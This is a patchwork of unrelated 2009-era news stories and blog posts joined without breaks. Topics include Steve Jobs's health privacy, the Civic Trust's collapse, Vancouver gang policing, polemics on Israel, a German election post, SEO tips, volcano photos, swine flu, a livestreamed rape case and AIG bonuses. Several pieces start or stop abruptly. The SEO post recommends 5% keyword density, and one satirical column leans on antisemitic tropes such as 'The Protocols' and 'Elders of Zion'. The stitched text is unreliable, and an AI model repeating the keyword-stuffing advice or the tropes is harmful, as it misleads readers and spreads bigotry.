And then today , we came across another NYT article titled “ For Steve Jobs , 35,420 Reasons to Talk “ , with the figure referring to the number of people expected to die from Pancreatic cancer this year .
The gist of the article is that Steve Jobs should publicly speak out about his illness a means to raise awareness and help fund - raise .
I can only imagine the impact a person of Mr. Jobs ’s global stature would have on awareness and fund - raising if he braved public disclosure of his condition .
And it would be brave .
It is n’t easy to talk about personal health issues under the best of circumstances , let alone with the whole world watching .
But people with pancreatic cancer need the kind of Hail Mary pass only a big player like Mr. Jobs could provide .
Am I crazy to think that its completely self - righteous for the author to expect , or perhaps demand , that Jobs start rallying for the cause a mere 2 months out from his surgery ?
Raising public awareness for any medical condition is always welcome , but that ’s not a role everyone is comfortable playing .
That ’s a decision each individual has to make on their own .
What makes the article all the more strange is that it references a statement from Patter Birsic and Jane Holt , co-founders of the National Pancreas Foundation .
The reality is that celebrities do bring attention to the disease .
When they chose to speak publicly about their health , Dr. Pausch and Mr. Swayze performed a tremendous public service .
By choosing not to speak publicly about his health , Mr. Jobs has also done a tremendous public service .
His choice reminds us that a person ’s health is a private matter .
We respect that choice , and the right of all patients to choose how they will deal with a very serious , and private , matter .
The bottom line is that health is a private matter , and to publicly demand that someone make their private health condition known to the public is classless , and quite surprising coming from a publication like the New York Times .
Perhaps Gruber is on to something when he writes :
The Wall Street Journal ’s story Friday night was a huge scoop for them , and I noted in my analysis of it that The New York Times , when they finally ran their first story with the news one day later , clearly could not find a source of their own , attributing the information only to the Journal ’s original report .
If you know anything at all about the culture of premier news organizations like the Journal and Times , you know how that hurt the Times .
Is the New York Times bitter because it was n’t able to get the scoop on Jobs ’ liver transplant , or am I reading way too much into things ?
Hit up the comments below and either pat me on the back or rip me a new one .

The 52 - year - old charity , which acted as the umbrella group for more than 750 Civic Societies across England , was best known for its annual Civic Trust Awards , its campaigning to ‘ create better , people - friendly places ’ and supporting the preservation of local heritage sites .
It is understood a ‘ squeeze on local authority spending ’ finally spelled the end for the Trust which , sources claim , had been in difficulties for some time .
Heritage Link , which represents 78 voluntary heritage organisations across the country , said the Trust ’s demise had sent shockwaves through the sector .

A spokeswoman said : ‘ The Trust captured the mood of the nation [ when it was founded in 1957 ] when quality of life , improving and caring for places where people live and work won political and popular support .
‘[ It ] made a significant contribution to policy work and in sharing best practice on planning and heritage matters including heritage protection reform .
That special perspective will be sorely missed . ’
Will Palin from SAVE Britain ’s Heritage agreed that the ‘ news was a real shock ’ .
The collapse of the Trust , which boasts Griff Rhys Jones as its president , emerged on Friday ( 17 April ) .
Talking to the BBC , Civic Trust chairman Philip Kolvin blamed the lack of local authority funding and added : ‘ I still passionately believe in the civic movement , but it now needs grassroots members of vision and energy to start afresh with a new organisation , working within its means and building gradually from the bottom . ’

This year ’s Civic Trust Awards - which could now be the last – heaped accolades on more than a 100 buildings which it regarded as making an ‘ outstanding contribution ’ to the built environment .
These included Rogers Stirk Harbour ’s Maggie ’s Centre at Charing Cross Hospital , Hammersmith and Gareth Hoskins ’ Culloden battlefield visitor centre in Inverness .
VANCOUVER – Constables Phil Gomes and Mike Clark – a .k.a.
Shake ' n '
Bake – are 27 and 28 , clean - cut and solidly built , and together form the newest and least - known front in Mexico 's drug wars : Canada .
Members of the coveted Integrated Gang Task Force in British Columbia , their orders are to " disrupt and dismantle " drug gangs , many of which maintain a cocaine lifeline to Mexico .
They do n't talk about it much , but they spend their days chasing down the " bad guys " and " sitting on " drug houses around Vancouver and the Lower Mainland of B.C .
While the U.S. Attorney General 's Office calls the Mexican drug cartels a " national security threat " and says 230 American cities have been infiltrated , the port city of Vancouver may be Canada 's first to feel the fallout from the crackdown on Mexico 's drug lords .
Already this year in the Vancouver area – nicknamed the gang capital of Canada – there have been 30 shootings ( with 12 fatalities ) directly linked to the gang shakeout in Mexico and tracked by the Washington - based Council on Hemispheric Affairs .
Some 130 gangs operate in B.C. , among them Red Scorpions , United Nations , MS - 13 , Bacon Brothers , Hells Angels and various independents – all with ties of varying degrees to lucrative Mexican cocaine , among other drugs from other places .
" Vancouver and British Columbia are unfortunately the focus of the largest number of organized crime groups in Canada , " warned Peter Van Loan , federal public safety minister and solicitor - general , in a speech in Langley this year .
A few days earlier , a gangster died nearby in a Mexican - style execution by machine - gun fire at the Thunderbird Village Mall .
In Mexico , where nearly 11,000 have died since Mexican President Felipe Calderón launched his government 's " war on drugs " in 2006 , drug - fuelled gangs impale heads on stakes and dissolve thousands of corpses in acid .
In Tijuana , a border town almost due south down the I - 5 from Vancouver , there are three , maybe four drug murders a day and cartel henchmen take down local cops for sport .
In Vancouver , police are witnessing an escalation in the brutality of killings .
Recently , in an apparently targeted hit , a gangster shot a young mother in her car as her 4 - year - old sat in the back seat .
Once , such actions were forbidden by established drug protocol .
Now , collateral damage is routine in the slaughterhouse of gangland hits .
IT'S THE " ARMED and dangerous " label describing the parolee that chills when it pops up on the police laptop .
It 's in bold type , hard to miss .
Still , Gomes and Clark have no choice but to locate the guy .
They climb out of their Chevy Tahoe and begin that unconscious pat - down of gear cops do .
They check vests and pockets and give their side arms a tap ; Gomes carries a Glock and his partner , Clark , a Sig - Sauer P - 226 .
It 's coming up on 10 p.m. on a Friday , and they 're on rounds in Langley , on the south side of the Fraser River , about 40 kilometres from Vancouver .
They 're doing a curfew check on an " associate " of the United Nations , a criminal organization with ties to Mexico and the world 's deadliest drug cartels .
It 's a full moon , but the light is watery .
This could turn bad : a lethal force option .
Gomes heads up the walk to the three - storey townhouse , rings the buzzer , and then knocks .
" POLICE , " he shouts .
" Open up ! "
The man is n't home – a breach of recognizance – and they 'll issue an arrest warrant .
Their mood brightens but , as Gomes says , " You just never know what 's on the other side of the door . "
RCMP SUPT .
Pat Fogarty , operations officer with the Combined Forces Special Enforcement Unit ( CFSEU ) , attributes the spike in Vancouver - area gang shootings directly to the police crackdown in Mexico .
What 's more , he knew it was coming .
" We saw this Mexican war starting to shake things up six months ago , " he says in an interview in a hotel lobby in Surrey , a neighbouring municipality to Langley .
The hotel is across the street from another site on our narco - murder tour , the parking lot of the busy Guildford Mall , scene of a recent execution .
" Things had been going well ( in the cocaine trade ) – and we 're talking about a significant , efficient business , " says Fogarty , 41 .
With his tailored brown suit , snappy loafers , red hair and freckles , he has the preppy look of any professional about to make a PowerPoint presentation .
Except his is about the genesis of guns , gangs and drugs .
" Suddenly , you reduce supply and , " he says in understatement , " things start to happen . "
Sometime last fall , he saw the price of cocaine on the street soar from the $ 29,000 - $ 32,000 - a- kilo range to more than $ 55,000 per kilo , although it 's gone back down to the regular price in recent months .
" Next thing you know , ( dealers ) are saying they can't get their hands on coke at any price .
They 're losing customers – and , remember , this is a leveraged business .
So the war disrupts the flow of cocaine and people fight to survive ... this is about power and greed . "

Fogarty makes another point , one that 's similar to arguments just as often heard these days in Mexican border cities Tijuana and Ciudad Juárez , where police attribute wildly escalating brutality to the military crackdown on cartels and a seismic shift in the value system of the latest crop of narco lords ( if one can indeed talk about ethics among thieves , kidnappers , scoundrels and assassins ) .
" I hear it all the time – the problems with the new generation , " begins Fogarty .
" There does n't appear to be one gang that controls the rest in B.C. , but there are a lot of shootings among a new generation that 's quick to the gun and wants fast money , fast cars and women , and does n't want to work hard .
The established value system , I 'm told , is eroding . "
Fogarty elaborates : " These young guys want to be feared and respected fast – but what seems to be missing are the more mature , powerful elements who put them in their place and say , ` Hey , we do n't do things that way . ' "
It 's about survival .
The older generation of gangsters , according to Fogarty , cleaves to a low profile , very low .
They 're not big on Dodge City shootouts and understand the dangers of public outrage hovering at the boil and police all over the place .
It 's their business , and they 've got a lot to lose .
Like everything .
Fogarty pauses , laughs : " Youth today ! "
IT'S ALMOST 2 a.m. on Saturday morning , and Gomes and Clark have clocked well over a hundred kilometres , checking in on bar and restaurant programs where staffers text police when gangsters show up .
They cruise mall parking lots where the drill 's the same : type in the plate numbers and see what pops out of the system .
In between , they inhale four - cheese pizzas and gallons of Timmy 's brew .
Before the bars close downtown , their teams hit the Gastown bar scene and scope out the rat- infested alleys of the Downtown East Side , where the sick prey upon the weak , exploitation at its cruellest .
It 's up to addicts to place their orders from idling cars , as tattooed driver / dealers show off portable drug buffets – all you can ingest for a price , possibly death .
And so convenient .
Dealers on foot roughly shake awake drugged - out zombies and try to force down that last 20 - rock of crack cocaine or another cheapo tab of ecstasy .
Ultimately , however , nothing clears out an alley like the slow drive - by of a big , black cop-mobile .
It 's been an okay night .
Gomes and Clark have their arrest warrant to take another Red Scorpion gangster out of circulation , albeit temporarily and if he can be located .
A fellow team collars three gang " associates " in Langley , charging one Red Scorpion with murder in the machine - gun execution and another with attempted murder by sledgehammer .
They have a couple of hours of paperwork before they take a break and do it all again tomorrow night .
Gomes and Clark may not see it this way , but they are integral to the drug war on Canada 's northern front .
Neither do they mention their bravery citations : Gomes ( home squad , Delta ) for pulling elderly residents out of a nursing home with a gas leak ; Clark ( from the Vancouver department ) for tackling dangerous home invaders on the run .
" Hey , hoser , how 's it going ? " asks a buddy , leaning in on the driver 's door .
" Just living the dream , " says Gomes .
" Living the dream . "

" The theory of the free press is not that the truth will be presented completely or perfectly in any one instance , but that the truth will emerge from free discussion "
- Walter Lippman ( 1889 - 1974 )
A rather frightening and totally ridiculous reality , one that has been with us for many years now , is currently in the process of becoming even worse , at least down in the United States .
This reality - the labeling of all criticism of Israel as " anti-Semitic " - threatens not only free speech and open debate , but the search for peace in the Middle East itself .
Check out this article by Paul Craig Roberts and see if you do n't agree : " The End of Free Speech ?
Criminalizing Criticism of Israel " .
Roberts , it should be noted , is no left - wing radical .
He 's the former Assistant Secretary of the Treasury in the Reagan Administration and he 's even referred to as the " Father of Reaganomics " .
We 're all well aware of this idea , put forward by the pro-Israel lobby and much of the media , that any sort of criticism of Israel , no matter how deserving , is indicative of one thing and one thing only : anti-Semitism .
However , it does n't take a genius to see this argument for what it really is : A load of nonsensical bullshit and highly irrational buffoonery .
And what , you ask , would these same people have you think of the many Jews , both inside and outside of Israel , who are highly critical of Israel 's actions , particularly when it comes to the treatment of the Palestinians ?
Well , they 're all , clearly , nothing more than " self - hating Jews " , of course .
Convenient , is n't it ?
Anyone who dares criticize Israel - again , even if they happen to be Jewish - must be a hate - filled racist , anti-Semite .
And probably a pedophile too , come to think of it .
Racist !
The truth , of course , is that criticizing Israel makes you no more of an anti-Semite than criticizing the regimes in Zimbabwe , North Korea , Burma , Iran or Saudi Arabia makes you a racist ( or criticizing Dick Cheney makes you anti-bald or an ageist , for that matter ) .
It 's simply a rather desperate tactic that 's used to try and deflect criticism away from horrific human rights abuses , not to mention outright war crimes .
Do n't like Robert Mugabe 's glorious leadership in Zimbabwe ?
You must be a racist !
Think Saddam 's gassing of the Kurds was a war crime ?
You anti-Arab bigot !
Do n't like the Saudi Arabian practice of jailing and whipping women for the " crime " of being raped ?
You xenophobic , hate - filled , anti-Arab , bigoted racist !!
Feel somewhat sickened by Israel 's slaughter in Gaza at the beginning of the year ?
Well , clearly , you 're nothing more than a lowdown , no - good anti-Semite !
Hate Is Real
Make no mistake , anti-Semites are very real , as are racists , homophobes , misogynists and the rest of their small - minded , bigoted ilk .
But none of that has anything to do with legitimate criticism of Israel .
Hell , I 'm sure there are even one or two self - hating Jews out there too ( current Israeli Minister of Foreign Affairs - and Chief Cabinet Secretary of Hate - Avigdor Lieberman comes to mind .
Hell , why not ?
He hates everyone else , it 's a good bet he 's probably pretty full of self - loathing as well ) .
But , whether the phantom " Self - Hating Jew " really exists or not , that , too , has nothing to do with our discussion here regarding legitimate criticism of Israel .
And , while we 're on the topic , why do n't we ever hear about the dreaded Self - Hating Zimbabwean ?
Or the sly , sinister Self - Hating Korean ?
Or the seething , venomous Self - Hating Burmese ?
Some Hope
Roberts is certainly dead - on in much of what he has to say .
However , I would disagree with his assertion that throughout the rest of the Western world - outside of the U.S. - it 's getting harder and harder for anyone to criticize Israel 's actions when it comes to the treatment of the Palestinians .
I 'd actually argue the opposite : that in Europe and here in Canada many more people now seem quite willing to question the brainwashing and whitewashing they 've been force - fed in regards to the Israeli - Palestinian situation .
It would seem that the slaughter in Gaza a few months back really opened the eyes of a lot of people to what 's actually going on over there and to the fact that one side is indeed terrorizing and victimizing the other ... and that the whole situation is quite the opposite of what our governments and most of the media would like us to believe .
In fact , I 'd even argue that this is becoming clearer to a lot more Americans these days as well , which would explain the push - back by the Israel Lobby and this crazy amendment to the Hate Crimes Prevention Act of 2009 .
This particular part of the Act , I 'm quite sure , will never stand up in court .
But the fact of the matter is it 'll take years to wind its way through the judicial system and finally make its way to the Supreme Court .
And in the meantime a lot of people will either be silenced or charged .
Which is a pretty fucked up situation , if you ask me .
Lobby
This !
As many others have noted before , one of the main threats - if not THE main threat - to a real , healthy , functioning democracy in America is the massive money , power and influence wielded by large lobby groups , such as the NRA and AIPAC ( the main Israel lobby group in America ) .
On so many important issues it does n't seem to matter all that much what the electorate thinks , it only matters that you , as a candidate for elected office , do n't upset the lobbyists .
For if you do , for instance , speak some truth about Israel 's crimes against the Palestinian people , you can be 100 % certain that AIPAC will throw everything they 've got ( including tens of millions of dollars ) into defeating you .
That this reality has had the desired ( chilling ) effect on political debate in America is indisputable .
But the question remains : Why ?
Why would anyone want to stifle any and all debate on this one topic ?
The only thing I can think of is a clear fear of the truth getting out .
Then again , maybe I 'm wrong .
Perhaps , as you read Roberts ' article , you can come up with some other explanation .
But I doubt it :
The End of Free Speech ?
Criminalizing Criticism of Israel
And , no , do n't worry , the simple act of reading this article will NOT make you an anti-Semite ... or a self - hating Jew .

Am Sonntag ist ja Europawahl .
Schön .
Ich bin ja mal gespannt , wie hoch die Wahlbeteiligung hier sein wird .
Wetten werden noch angenommen … 😉
Nun propagieren die Etablierten ja gern , dass man doch auf gar keinen Fall seine Stimme “ verschenken ” soll , wenn man schon zur Wahl geht .
Den so richtig wirksam ist sie erst dann , wenn man seine Stimme einer der großen Parteien schenkt .
Oder auch an sie verschenkt .
Je nach dem wie man das sieht .
Denn warum soll man eine Partei wählen , die den eigenen Vorstellungen nicht entspricht ?
Oder warum soll man die kleinen Vereinigungen und Parteien nicht wählen dürfen ?
Eine interessante Begründung , warum man trotzdem eine kleine Partei wählen sollte , liefert der Blogbetreiber von Morgenlandfahrt :
“ … Ich werde ab und an gefragt ob es nicht unsinnig ist , seine Stimme an eine kleine Partei zu verschenken .
Nach meinem Empfinden würde ich meine Stimme aber eher verschenken , wenn ich sie den arrivierten Parteien geben würde , denn diese sind ja schon in den Parlamenten und ich kann jeden
Tag neu sehen , dass sie eben nicht Politik machen um Probleme zu lösen .
Ich will , dass wir uns wieder auf unsere Stärken besinnen , ich will , dass wir uns zueinander bekennen und dazu gehört unter anderem , dass wir uns wieder als Menschen sehen und nicht als Produktionsfaktor oder als Teil einer Statistik .
Ich will zudem , dass Menschen in Notsituationen geholfen wird und ich will dabei keine endlosen Diskussionen über allzu oft unanständig niedrige Aufstockungen im Sozialsektor und andererseits ein unreflektiertes Durchwinken von Subventionsmilliarden ( seien sie auch noch so sinnlos ausgegeben ) … . ”

On page optimization is one of the most important things you can do to increase the organic ranking of your website in the Google search engine results page , also know as " SERP's " .
Search Engine Optimization ( SEO ) has become a useful marketing tool , that it has spawned an industry of profitable companies dedicated to Search Engine Marketing .
Since SEO is such a resourceful way to gain exposure and branding on your website , why not learn how to do it for your own website or blog ?
Using simple tricks of the trade , also known as the best practices of SEO , you can adjust your search engine position by a decent amount , and get extra traffic on long - tail keywords , in your blog posts .
I 'm going to review some of the most effective , simple , and oldest best practices of SEO tricks to you , so pay attention !
Your title tag , as seen at the top of your internet explorer , firefox , opera , or chrome ( PS - Do n't use internet explorer ! ) , is a solid way of proving to your potential visitor that your site is what they want to see when they perform a search .
A title tag shown in the search engine results are the most obvious thing there - usually identical to what is on the top of the browser .
To access or change your title tag in dreamweaver or basic html , look for the !
If you are using a content management system like Drupal or Wordpress , then your title tag is defined either by CleanURLS ( Drupal ) or Permalinks ( Wordpress ) .
To access Permalinks in wordpress , simply look at your tools tab and click " permalinks " .
Then you will be given some options of how to form your posts , the most commonly seen ones ( and most SEO friendly ) are % category % / %postname % .
Now a day , meta tags are really not the single most important SEO strategy .
Back in the day , you were able to cram as many keywords into the meta keyword tag as you wanted , to rank for basically every one of those keywords !
Now , it is best practice to optimize each individual page for one specific keyword .
If you run a balloon site , for example , you would want " balloons " for your home page , " red balloons " for a page about red balloons , and " inflatable balloons " for it 's own page .
I take this more seriously than the meta keyword tag , simply because this is what Google reads and displays in the SERPs .
Having a well written meta description can increase your click through rate .
It is ideal to place the keyword in the meta description twice , for extra boldness .
If you do n't know what I mean by boldness - just do a search for " balloon " and you 'll notice any instance of " balloon " is bolded .
Including the Title tag , meta description , and , our next point - URL .
Not talking about a gathering of nerds , obsessing over URL names .
Not one bit .
I 'm talking about how your URL's are structured .
They should include the keyword of your niche , ie - a balloon website like " balloonworld.com " will do much better for the term " balloon " than " blowupthings.com " simply because the keyword is stuck right in there !
A great strategy that works .
See the Title Tag reference for wordpress use ( blog post names are excellent for long tail keywords ) .
Some will argue that content is king - I completely agree , but it is n't royalty without any backlinks to it .
An SEO friendly article will have at minimum , 500 words , with a keyword density of 5 % .
Use your keyword 25 times if you have a 500 word article .
Pretty simple stuff !
Spread it out , use the " strong " tag on one of the keywords as well .
No idea why this seems to help , but it also gives it importance , as read by a human .

Obama gets tough with the Israelis – or , rather , talks about getting tough – and hilarity ensues :
" In a sign of growing concern in Prime Minister Binyamin Netanyahu ’s government over U.S. President Barack Obama ’s Middle East policies , Minister - without - Portfolio Yossi Peled proposed Israeli sanctions on the U.S. in a letter to cabinet ministers on Sunday .
" In the 11 - page letter , obtained by the Jerusalem Post from a minister on Monday , Peled recommends steps Israel can take to compensate for the shift in American policy , which he believes has become hostile to Israel . "
According to Peled , the Obama administration will eventually come to realize the error of its ways , but for now the U.S. president seems intent on exerting " intensive pressure to stop building in settlements , remove outposts , and advance the formation of a Palestinian state " – all steps previously agreed to by Israeli leaders , by the way , and now thrown in the trash bin by the far - Right nutballs who have captured the Israeli government .
" But in the interim , " the Post reports , " the minister suggests reconsidering military and civilian purchases from the U.S. , selling sensitive equipment that the Washington opposes distributing internationally , and allowing other countries that compete with the U.S. to get involved with the peace process and be given a foothold for their military forces and intelligence agencies . "
The irony of someone " reconsidering military and civilian purchases " which are being made , or will be made , with our money is a real hoot – but the laughs are just starting !
There ’s just one conceivable answer to the suggestion that Israel should start " selling sensitive equipment that Washington opposes distributing internationally " : when did they ever stop ?
The Israelis have been stealing U.S. technology and selling it to the Chinese – for one example – for years , much to Washington ’s chagrin .
So does this mean they ’re going to be doing it openly , instead of sneaking around and doing it on the sly ?
As for the idea of giving " other countries that compete with the U.S. " a military foothold – go for it , Yossi !
I can hardly wait until the Venezuelan army arrives to guard the Wall of Separation .
And no doubt the Chinese – grateful for all the high - tech weaponry you ’ve stolen on their behalf – will be more than happy to guard the illegal settlements you ’re building ( with our tax dollars ) .
And although the French would be grateful , I ’m sure , if the Israelis switched from Boeing to Airbus – as Peled suggests – they probably would n’t want to get involved militarily .
The most you can expect is that they ’ll displace Jerry Lewis from their national pantheon of comedic culture heroes and install this guy in his place .
Oh , but we have n’t even gotten to the best part of this " news from Bizarro World " item :
" In what may be his most controversial suggestion , Peled recommends intervening in American congressional races to weaken Obama and asking American Jewish donors not to contribute to Democratic congressional candidates .
He predicted that this would result in Democratic candidates pressuring Obama to become more pro-Israel . "
Israel intervene in U.S. politics – why , what a novel idea !
If Peled had n’t suggested it , it would never – ever – have occurred to me .
Okay , now that you ’ve stopped laughing , just consider : look at all the pro-Israel money that has flowed into the coffers of U.S. congressional candidates , and you have to wonder – is it really enough ?
Surely the Israelis can afford to ship a few million of those billions we give them directly back to Washington .
And , when you think about it , is n’t this a way for the Israelis to make up for their boycott of Boeing and other U.S. providers – by pumping extra millions into the U.S. economy , via the campaign chests of our elected officials ?
They do n’t call it a " special relationship " for nothing .
The reality , of course , is that the Israelis and their American amen corner are already buying up U.S. politicians by the dozen – no , AIPAC does n’t do it directly , they do it through a complex network of local and regional political action committees .
As for the idea of Israel and its American friends exerting pressure on a U.S. official in exchange for under - the - table favors – like , say , intervening in an espionage case – well , it is absolutely unheard of …
Or is it ?
You really ca n’t make this stuff up , and , what ’s more , you do n’t have to bother .
Because the last two times the Israelis went in and slaughtered a few thousands of their neighbors , the U.S. Congress voted to hail them as heroes .
When it become clear that our president would n’t be catering to the Israelis ’ each and every whim , AIPAC circulated a letter demanding that the White House not " pressure " Tel Aviv – and more than three - quarters of the U.S. Senate signed it , along with the vast majority of House members .
Congress is already " Israeli - occupied territory , " as one wag famously put it , so Peled ’s suggestion is redundant , to say the least .
What I suggest , however , is that they start a campaign to impeach Obama , and , once they ’ve succeeded , they should finance and run their own candidate for the White House .
After all , look how they got rid of Cynthia McKinney and filled her seat with a suitable replacement .
Yes , the laughs just keep on coming :
" Peled called for the formation of a new body intended to influence American public opinion .
The groups he suggests courting include Hispanic Americans and labor unions in industries that benefit from Israeli military acquisitions . "
What a great idea : they can call the " new body " the " Elders of Zion " and put out a manifesto entitled – what else ?
– The Protocols .
Then they can translate it into Spanish and pass it out at taco joints and factory gates ( those that are n’t closed on account of the recession and the Israeli boycott of U.S. goods and services ) .
Now there ‘s a winning strategy if ever I saw one !
Seriously , though , what gets me are the disingenuous responses to the Peled sanctions campaign from our pro-Israel lobbyists .
" He ’s right , " said Shoshana Bryen , senior director for security policy at the Jewish Institute for National Security Affairs , but maybe he should n’t talk so loud : " She warned that such expressions could ‘ take on a life of their own , ’ " the Post reports , " and that some of Peled ’s policy prescriptions could be less than helpful for the Jewish state . "
Well , yes , Bryen does have a point : what if the U.S. suddenly stopped the $ 3 billion - plus in annual aid to the Jewish state ?
That might prove less than helpful , to be sure .
And , even worse , the idea that our Israeli " allies " are faithless , spoiled , and have an unjustifiable sense of entitlement might take on a life of its own , so to speak – and help ensure that the aid cutoff is total , and permanent .
Not that this will ever happen , you understand , not even if the Israelis bombed Washington with those U.S. - bought - and - paid - for fighter jets .
Smarties like Ira Forman are way ahead of Peled on this :
" Democratic political activists in Washington dismissed out of hand Peled ’s suggestions , saying that such an approach would have little chance of influencing Congress ’ posture on Israel .
‘ It shows Yossi Peled is terribly uninformed about U.S. politics , ’ said National Jewish Democratic Council Executive Director Ira Forman .
‘ He does n’t understand the politics of the American Jewish community .
He does n’t understand the politics of the Democratic Party . ’ "
In short , Peled does n’t understand that the U.S. Congress has already been bought and sold by pro-Israel money – and that any more cash would be redundant .
Peled also does n’t understand that no one is supposed to talk about this , unless they ’re an unsuccessful Democratic candidate for president who never had much of a chance anyway .
Nothing is ever said , yet the quid pro quo is all - too - well understood .
The Post reports Forman ’s comment that " such efforts , if attempted , would neither shift congressional support away from Obama nor boomerang to hurt Israel ’s backing on Capitol Hill , " and I ’d lay odds on it .
Before any " boomerang effect " sets in , at least in the hallowed halls of Congress , the Israelis would have to set off a couple of nukes in major American cities – and even then , there would probably be a congressional resolution expressing undying support for the " special relationship " in spite of all that bothersome radioactivity .
Okay , we ’ve all had our laugh for the day , a light moment that enables us to rise above the depressing everyday reality , but before we return to the mundane world of the distinctly non-amusing , let ’s consider just who Yossi Peled is , and his place in the Israeli political landscape .
Surely he ’s some fire - breathing extremist , a Kahanist or a supporter of Avigdor Lieberman ’s neo -fascist party – right ?
Wrong .
According to the Jerusalem Post , he ’s a " moderate , " a relative " dove " who ’s a Likudnik , albeit on the " left " flank of Prime Minister Benjamin Netanyahu ’s party .
In which case , can you imagine what the real extremists are wont to do in response to Obama ’s new policy ?
For years , we ’ve heard about how " pro-American " the Israelis are : why , they ’re just like us – a democratic and inherently Western state that is embedded in an anti-American sea .
Well , not anymore .
Today , the Foreign Ministry of Israel is run by a man who could be compared , with much justification , to the failed painter from Vienna , or at least a Bizarro World Jewish version of the same .
Israelis want to deport their Arabs , seize their land , and construct a " Greater Israel . "
What ’s more , anti-Americanism is on the rise in Israel – as Peled ’s comments suggest – and the most anti-American of them all appear to be those Israeli - American dual citizens who vote in U.S. elections and go to Israel regularly , where Max Blumenthal recently captured their rabid anti-American sentiments on video .
What I want to know is this : when , oh , when will the American people wake up to the basic absurdity of the " special relationship " – and put an end to it , forever ?
Their president , it seems , is aware that our national interests are not served by this condition of mutual resentment and dependency .
Now that Israel ’s true face is showing , how long before all the public relations efforts in the world fail to mask the ugly reality ?
And the reality is this : Israel has been a burden , not a benefit , to the U.S. and its national interests abroad .
By giving the Jewish state our unconditional support , we have , ironically , set ourselves up for some " blowback " from Israel ’s direction – and it is n’t pretty , is it ?
GM CEO Fritz Henderson was on Glenn Beck ’s show yesterday and fielded questions about the government ’s involvement in GM after the bailout , stating that they appreciate the support and the government has not meddled in their business .
Beck also did n’t expect Henderson to defend the United Auto Workers ( UAW ) .
When Beck claimed that the unions are “ strangling ” GM , Henderson shot him down :
“ They ’ve been more part of the solution than the problem … yes , we have significant legacy costs that we ’re trying to address .
Frankly , they ’re trying to help us address those issues at the same time …
I view the unions are more part of the solution than the problem .
Me personally . ”
All Beck could say in response was , “ Wow , OK . ”

Stunning pictures of the volcano that blew a hole in the sky as astronauts witness eruption from International Space Station
Framed by a circle of clouds , this is a stunning illustration of Nature 's powerful force .
A plume of smoke , ash and steam soars five miles into the sky from an erupting volcano .
The extraordinary image was captured by the crew of the International Space Station 220 miles above a remote Russian island in the North Pacific .
Bird 's eye view : Safe from harm , NASA scientists look down on the Sarychev Peak volcano as the dramatic eruption takes place .
The force of the blast sends clouds scattering
The round hole in the clouds is thought to have been caused by the shockwave of the initial explosion .
At the centre lies the billowing mushroom tower of grey and brown ash .
For volcano experts , the most exciting part of the image is the layer of smooth white cloud that caps the plume - a little like a layer of snow on a mushroom .
This cap of condensed air is created from the rapid rising and then cooling of the air directly above the ash column .
When moist , warm air rises quickly it creates a cloud .
As the ISS continues its perfectly - timed flyby , the eruption continues unabated .
The perfect ' plume ' at the top of the volcano implies there is no shearing wind , which would have disrupted the pattern
Stretching behind the volcano lies the vast shadow caused by the eruption , as the blast continues to grow
This cap , which meteorologists call a pileus cloud , is already beginning to break up in these images - and would have vanished soon afterwards .
Far below , a thunderous line of light grey cloud can be seen falling down the sloping sides of the volcano .
This is a deadly pyroclastic flow - a mixture of hot gas and ash that destroys everything in its path .
Reaching temperatures of 600C ( 1,112 F ) and moving at 130 mph , a pyroclastic flow is the most dangerous part of a volcanic eruption .
Where in the world ?
Sarychev Peak is to the north of Japan and east of Russia
Thankfully , Matua Island is uninhabited .
The eruption of Sarychev Peak began a week ago and is still under way .
The International Space Station has continued to track the ash cloud over the last few days .
The plume is a few hundred miles from one of the world 's busiest air corridors .
Hundreds of flights across the Pacific have been diverted to avoid any chance of it knocking out plane engines .
Sarychev
Peak is one of the most active volcanoes in Russia 's Kuril archipelago .
Eruptions have been recorded as far back as the 1700s , with the last known one in 1989 .
These images show the plume drifting through the atmosphere in the hours and days after the eruption
Between the two overpasses on June 14 , the ash spread north and west from the volcano
By June 15 , the ash had spread out to the east and west
You 've seen the hole in the clouds - now see the hole in the universe :
A hole in the clouds is one thing , but a hole in the fabric of the universe is quite another .
With interstellar matter evenly distributed across the skies , this black anomaly is a bit of a head - scratcher - is it a black hole ?
A worm - hole ?
A stairway to Heaven ?
Or just the start of the collapse of the universe , which doomsayers assure us will start in 2012 ?
No , it 's none of these things .
Instead , its a dark molecular cloud - a mass of of dust and gases which combine to blank out all the visible light from the background stars .
Many of these ' dark absorption nebulae ' have been discovered across the galaxy , with this one called Barnard 68 in the Ophiuchus constellation .
NASA 's picture of the ' hole in the sky ' - now known to be a dark molecular cloud absorbing all the visible light from stars behind it
Measurements place this at a relatively close 500 light years away - much further away and the odds are there would be stars visible in front of Barnard 68 .
It is calculated to be about half - a- light year across ( a light - year being the distance light can travel through a vacuum in the course of a year ) .
The Plymouth Diocese has 93 parishes
Catholic churches in Devon , Cornwall and Dorset have been advised not to offer wine during communion to help halt the spread of swine flu .
The Plymouth diocese told its priests they should offer only the consecrated bread directly into people 's hands .
Letters from the Diocese went out last weekend , before it was confirmed two adults in Plymouth had the virus .
The Diocese said it took the step after the World Health Organisation upgraded the seriousness of the disease .
The Plymouth Diocese has 93 parishes stretching from Penzance and the Isles of Scilly in the west to parts of Bournemouth in the Dorset .
It is divided into five deaneries , Cornwall , Plymouth , Torbay , Exeter and North and East Devon , and Dorset .
There have been three cases of the virus in Devon , two people in Plymouth and a 12 - year - old girl in Torbay .
In Cornwall there have been 10 cases , including nine pupils at Bolitho School in Penzance .
In Dorset two holiday - makers were diagnosed in Weymouth .
A man who raped an unconscious woman live on Stickam has been arrested and charged by police in Arizona .
The case only came to light after the woman , who was unaware of being raped , was told by friends that a video of the rape was circulating on the internet .
According to BNO
News , the video recorded in her bedroom shows Johnathon Richard Hock , who the victim was dating at the time , raping her live on camera .
It is n’t clear from the report whether the Hock set the live stream up , or whether the camera was already on and streaming at the location .
What is perhaps more disturbing is that the rape was witnessed live , and reported to the police either as it was happening , or some time there after ( but before an official compliant was received . )
According to local media , the eyewitness said in a statement that Hock was “ laughing and making comments ” including “ how the victim would never know what was happening to her because she was passed out . ”
Hock has been charged with sexual assault , kidnapping and posting the video on a website without the victim ’s knowledge .
The 2008 AIG bonus pool just keeps getting larger and larger .
AIG bonuses higher than reported
The 2008 AIG bonus pool just keeps getting larger and larger .
In a response to detailed questions from Rep. Elijah Cummings ( D - Md. ) , the company has offered a third assessment of exactly how much it paid out in bonuses last year .

And the new number , offered in a document submitted to Cummings on May 1 , is the highest figure the company has disclosed to date .
AIG now says it paid out more than $ 454 million in bonuses to its employees for work performed in 2008 .
That is nearly four times more than the company revealed in late March when asked by POLITICO to detail its total bonus payments .
At that time , AIG spokesman Nick Ashooh said the firm paid about $ 120 million in 2008 bonuses to a pool of more than 6,000 employees .
